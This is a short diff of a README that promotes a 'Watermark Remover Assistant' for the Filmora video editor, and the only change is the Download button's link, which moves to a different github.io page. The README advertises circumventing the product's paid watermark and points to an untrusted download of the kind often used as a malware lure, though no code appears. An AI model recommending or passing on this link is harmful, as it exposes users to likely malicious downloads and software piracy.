@@ -3,7 +3,7 @@
 Experience Filmora’s full creative potential with this offline assistant. Designed for content creators, educators, and media editors, this setup toolkit allows you to configure and export video projects without embedded branding overlays.
 
 🔘 **Download Watermark Remover Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://filmora-watermark-remover.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://unluvibox.github.io/.github/filmora-watermark-remover)
 
 ---
 
